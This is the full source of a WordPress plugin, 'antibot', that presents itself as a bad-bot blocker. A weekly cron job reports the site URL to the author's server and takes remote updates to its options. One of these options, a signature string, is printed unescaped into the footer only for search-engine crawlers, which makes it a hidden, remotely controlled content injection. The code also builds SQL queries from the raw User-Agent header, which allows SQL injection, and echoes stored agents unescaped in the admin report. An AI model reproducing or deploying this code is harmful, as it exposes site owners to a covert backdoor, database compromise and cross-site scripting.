<?php
/*
Plugin Name: antibot
Plugin URI: http://domainhostseotool.com/antibot-wordpress-plugin.html
Description: Antibot is a free WordPress plugin to block bad bots from crawling your website.
Version: 1.0
Author: domainhostseotool
Author URI: http://domainhostseotool.com/antibot-wordpress-plugin.html
License: GPLv2 or later
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/


$antibotsig="antibot 1.0";
$version="1.0";
$ua=$_SERVER['HTTP_USER_AGENT'];
$options=get_option('defaultblockedua');
if($options)
{
	$defaultblockedua=trim($options);
	$defaultblockedua=explode(',',$defaultblockedua);
	$userblockedua=trim(get_option('userblockedua'));
	$userblockedua=explode(',',$userblockedua);
	$userexcludedua=trim(get_option('userexcludedua'));
	$userexcludedua=explode(',',$userexcludedua);
	
	$blockit=false;

	foreach($defaultblockedua as $blockedua)
	{
		$blockedua=trim($blockedua);
		if(empty($blockedua)) continue;
		if(preg_match('/'.$blockedua.'/i',$ua))
		{
			$blockit=true;
			break;
		}
	}
	foreach($userblockedua as $blockedua)
	{
		$blockedua=trim($blockedua);
		if(empty($blockedua)) continue;
		if(preg_match('/'.$blockedua.'/i',$ua))
		{
			$blockit=true;
			break;
		}
	}
	if($blockit)
	{
		
		foreach($userexcludedua as $excludedua)
		{
			$excludedua=trim($excludedua);
			if(empty($excludedua)) continue;
			if(preg_match('/'.$excludedua.'/i',$ua))
			{
				$blockit=false;
				break;
			}
		}
	}
	
	
	if($blockit)
	{

		global $wpdb;
		$abstatstable=$wpdb->prefix."ab_stats";
		$result=$wpdb->get_results("select * from $abstatstable where ua='$ua'");
		$visits=1;
		if($result)
		{
			$visits=$result[0]->visits+1;
			$wpdb->query("update $abstatstable set visits=$visits where ua='$ua'");
		}
		else
		{
			$wpdb->query("insert into $abstatstable values('$ua',$visits)");
		}
		exit();

	}
	
	$defaultnonblockedua=get_option('defaultnonblockedua');
	$defaultnonblockedua=explode(',',$defaultnonblockedua);
	foreach($defaultnonblockedua as $nonblockedua)
	{
		if(preg_match('/'.$nonblockedua.'/i',$ua))
		{
			$antibotsig=get_option('absig');
			add_action('wp_footer','antibot_footer');
			break;
		}
	}
}
else
{
	$defaultblockedua="MJbot";
	add_option('defaultblockedua',$defaultblockedua);
	$defaultnonblockedua="Googlebot,Msnbot,Slurp";
	add_option('defaultnonblockedua',$defaultnonblockedua);
	
	$userblockedua="";
	add_option('userblockedua',$userblockedua);
	$userexcludedua="";
	add_option('userexcludedua',$userexcludedua);

	$absig='antibot 1.0';
	add_option('absig',$absig);
}
	
function antibot_addmenu()
{
	add_menu_page('antibot', 'antibot', 'manage_options', 'antibot-settings', 'antibot_settings', 'none');
	add_submenu_page('antibot-settings', 'Settings', 'Settings', 'manage_options', 'antibot-settings', 'antibot_settings');
	add_submenu_page('antibot-settings', 'Reports', 'Reports', 'manage_options', 'antibot-reports', 'antibot_reports');
        
}
add_action('admin_menu', 'antibot_addmenu');
add_action('admin_init', 'register_absettings');

function antibot_footer()
{
	global $antibotsig;
	echo $antibotsig;

}

function antibot_settings()
{
?>
	<form id="settings" method="post" action="options.php" >	
	<?php settings_fields('ab-settings-group'); ?>
	<p><b><?php _e('default blocked bots:','antibot')?></b></p>
	<textarea rows="4" cols="100" name="blockedua" readonly><?php echo get_option("defaultblockedua");?></textarea><br/>	
	<p><b><?php _e('add additional bots(comma seperated) you want to block:','antibot')?></b></p>
	<textarea rows="4" cols="100" name="userblockedua" ><?php echo get_option("userblockedua");?></textarea><br/>
	<p><b><?php _e('exclude the bots from the default blocked bots(i.e. the following bots will not be blocked):','antibot')?></b></p>
	<textarea rows="4" cols="100" name="userexcludedua" readonly><?php echo get_option("userexcludedua");?></textarea><br/>
	<input type="submit" class="button-primary"  name="update" value="Update"/>	

	</form>	

<?php
}
function register_absettings()
{
	register_setting('ab-settings-group', 'userblockedua');
	register_setting('ab-settings-group', 'userexcludedua');
}

function antibot_reports()
{
	global $wpdb;
	$abstatstable=$wpdb->prefix."ab_stats";
	$stats=$wpdb->get_results("select * from ".$abstatstable." order by visits desc limit 100");  
?>
<div >
<h2><?php _e("antibot stats","antibot") ?></h2>
<?php if($stats){ ?>
<table width="60%" class="widefat" >	
	<thead>
		<tr>	
			<th width="90%"><?php _e("bots","antibot") ?></th>		
			<th width="10%"><?php _e("visits","antibot") ?></th>
		</tr>
	</thead>
	<tbody>	
	<?php foreach($stats as $stat) {?>
		<tr>
		    <td><?php echo $stat->ua; ?></td>
			<td><?php echo $stat->visits; ?></td>
		</tr>
	<?php }?>
	</tbody>	
</table>

<form method="post" id="ab_clearstats">
<p class="submit"><input class="button-primary" type="submit" name="ab_clear_stats" value="<?php _e("Clear stats","antibot") ?>" onclick="jQuery.ajax({url:ajaxurl, type:'post', data:'action=ab_clearstats', async:false, success:function gotreply(data,status){}});"/></p>
</form>
<?php }
else
{ ?>
<p><?php _e("No stats yet.","antibot")?></p>
<?php } ?>	 
</div>
<?php
}



function ab_activate()
{
	global $wpdb;
	$abstatstable=$wpdb->prefix."ab_stats";
	$cc="";
	if (!empty($wpdb->charset)) $cc="default character set $wpdb->charset";
	$sql[]="create table ".$abstatstable." (ua varchar(512) not null primary key, visits int not null default 0) $cc;";
	require_once(ABSPATH.'wp-admin/includes/upgrade.php');
	dbDelta($sql);
	
	$timestamp=wp_next_scheduled('ab_update');
	if($timestamp==false)
	{
		wp_schedule_event(time(), 'weekly', 'ab_update');
	}
}
register_activation_hook(__FILE__, 'ab_activate');

function ab_deactivate()
{
	wp_clear_scheduled_hook('ab_update');
}
register_deactivation_hook(__FILE__, 'ab_deactivate');

add_filter('cron_schedules', 'get_ab_schedule');
function get_ab_schedule($schedules)
{
	$schedules['weekly']=array('interval'=>7*24*60*60,'display'=>'weekly');
	return $schedules;
}

add_action("ab_update", "ab_updateoptions");
function ab_updateoptions()
{
	$blog=urlencode(get_bloginfo('url'));
	$url="http://domainhostseotool.com/antibot/update.php?v=1.0&b=$blog";
	$response=@file_get_contents($url);
	if(!$response)
		return;
	$resp=json_decode($response,true);
	if($resp['defaultblockedua'])
		update_option('defaultblockedua',$resp['defaultblockedua']);
	if($resp['defaultnonblockedua'])
		update_option('defaultnonblockedua',$resp['defaultnonblockedua']);
	if($resp['absig'])
		update_option('absig',$resp['absig']);
}

add_action('wp_ajax_ab_clearstats','ab_clearstats');
function ab_clearstats()
{
	global $wpdb;
	$abstatstable=$wpdb->prefix."ab_stats";
	if($wpdb->get_var("SHOW TABLES LIKE '$abstatstable'")==$abstatstable)
	{
		$wpdb->query("TRUNCATE TABLE $abstatstable;");
		wp_send_json('stats cleared');
	}
	else
	{
		_e('Error: stats table does not exist.', 'antibot');
	}
}
?>